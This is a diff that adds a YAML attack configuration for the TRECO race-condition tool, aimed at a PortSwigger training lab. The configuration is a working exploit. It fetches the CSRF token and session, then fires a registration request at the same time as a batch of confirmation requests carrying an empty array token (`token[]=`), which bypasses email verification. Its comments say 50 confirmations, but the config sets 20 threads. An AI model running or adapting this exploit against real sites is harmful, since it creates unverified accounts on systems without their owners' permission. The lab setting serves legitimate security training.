@@ -1,0 +1,201 @@
+# ============================================================================
+# TRECO Configuration: PortSwigger Partial Construction Race
+# ============================================================================
+#
+# Exploits the partial construction race condition by sending one registration
+# request followed by 50 confirmation requests simultaneously.
+#
+# Target: PortSwigger Lab - Partial Construction Race Condition
+# Attack: Partial Construction (token=NULL)
+#
+# Usage:
+#   treco attack.yaml --argv target=<lab-url>
+#
+# Reference:
+#   https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction
+#
+# ============================================================================
+
+metadata:
+  name: "PortSwigger - Partial Construction Race"
+  version: "1.0"
+  author: "TRECO Framework"
+  vulnerability: "CWE-362 (Race Condition)"
+  description: |
+    Demonstrates thread groups feature for exploiting partial construction
+    race conditions where one thread creates an object with NULL token
+    and 50 threads simultaneously attempt to confirm without a token.
+
+target:
+  host: "{{ env('LAB_HOST') }}"
+  port: 443
+  threads: 20
+  reuse_connection: false
+  tls:
+    enabled: true
+    verify_cert: false
+  # proxy:
+  #   type: http
+  #   host: 127.0.0.1
+  #   port: 8080
+
+entrypoint:
+  state: get_register_page
+  input:
+    # Generate unique username for this attack
+    username: "attacker-{{ '%08x' | format(range(0, 16777215) | random) }}"
+    email: "attacker@ginandjuice.shop"
+    password: "hacked123"
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 1: Get Registration Page
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  get_register_page:
+    description: "Get CSRF token for registration"
+    
+    request: |
+      GET /register HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Connection: close
+
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: phpsessionid
+    
+    logger:
+      on_state_leave: |
+        🔐 Session: {{ get_register_page.session[:16] }}...
+        🎫 CSRF: {{ get_register_page.csrf_token[:16] }}...
+        👤 Attempting to register: {{ username }} ({{ email }})
+    
+    next:
+      - on_status: 200
+        goto: race_attack
+
+  # --------------------------------------------------------------------------
+  # Race Attack with Thread Groups
+  # --------------------------------------------------------------------------
+
+  race_attack:
+    description: "Exploit partial construction with thread groups"
+    
+    # Note: No single 'request' field - each thread group has its own request
+    request: ""
+    
+    race:
+      sync_mechanism: barrier
+      connection_strategy: multiplexed
+      thread_propagation: single
+      
+      thread_groups:
+        - name: registration
+          threads: 1
+        
+          request: |
+            POST /register HTTP/1.1
+            Host: {{ target.host }}
+            Content-Type: application/x-www-form-urlencoded
+            Cookie: phpsessionid={{ get_register_page.session }}
+            
+            csrf={{ get_register_page.csrf_token }}&username={{ username }}&email={{ email }}&password={{ password }}
+          
+          variables:
+            description: "Create user account"
+        
+        # Group 2: Confirmation requests (exploit the NULL token race window)
+        - name: confirmations
+          threads: 20
+          delay_ms: 50
+          
+          request: |
+            POST /confirm?token[]= HTTP/1.1
+            Host: {{ target.host }}
+            Content-Length: 0
+          
+          variables:
+            description: "Confirm without token"
+    
+    logger:
+
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        {% if input.name == "confirmations" %}
+        🎉 {{ input.variables.description }}: CONFIRMED! Account created without email verification!
+          👤 Username: {{ username }}
+          📧 Email: {{ email }}
+          🔑 Password: {{ password }}
+        {% else %}
+        ✅ {{ input.variables.description }}: Success (HTTP {{ response.status_code }}) - {{ "%.04f" | format(timing_ms) }} ms
+        {% endif %}
+        {% else %}
+        ❌ {{ input.variables.description }} failed (HTTP {{ response.status_code }}) - {{ "%.04f" | format(timing_ms) }} ms
+        {% endif %}
+
+      on_state_enter: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🦎 TRECO - Partial Construction Race Attack                                 ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  🎯 Target:   {{ "%-62s" | format(target.host)                            }} ║
+        ║  👤 Username: {{ "%-62s" | format(username)                               }} ║
+        ║  📧 Email:    {{ "%-62s" | format(email)                                  }} ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+
+        {% set registration = race.thread_groups | selectattr("name", "equalto", "registration") | first %}
+        {% set confirmations = race.thread_groups | selectattr("name", "equalto", "confirmations") | first %}
+           Group 1: registration   ({{ registration.threads }} thread,  {{ registration.delay_ms }}ms delay)
+           Group 2: confirmations ({{ confirmations.threads }} threads, {{ confirmations.delay_ms }}ms delay)
+        
+        ⏳ Starting race attack...
+
+        
+      
+      on_state_leave: |
+        
+        ✅ Race attack completed!
+        
+        📊 Results Summary:
+        {% set success_count = namespace(value=0) %}
+        {% for result in race_attack %}
+          {% if result.status == 200 or result.status == 302 %}
+            {% set success_count.value = success_count.value + 1 %}
+          {% endif %}
+        {% endfor %}
+           ✓ Successful requests: {{ success_count.value }}/51
+        
+        {% if success_count.value > 1 %}
+        🎉 VULNERABLE! Multiple confirmations succeeded - partial construction exploited!
+        {% else %}
+        ⚠️  Only {{ success_count.value }} request(s) succeeded - may not be vulnerable
+        {% endif %}
+    
+    next:
+      - on_status: [200, 302]
+        goto: end
+
+  # --------------------------------------------------------------------------
+  # Terminal States
+  # --------------------------------------------------------------------------
+
+  end:
+    description: "Attack complete"
+    logger:
+      on_state_enter: |
+        
+        ──────────────────────────────────────────────────────────────
+        🏁 Attack sequence complete
+        ──────────────────────────────────────────────────────────────
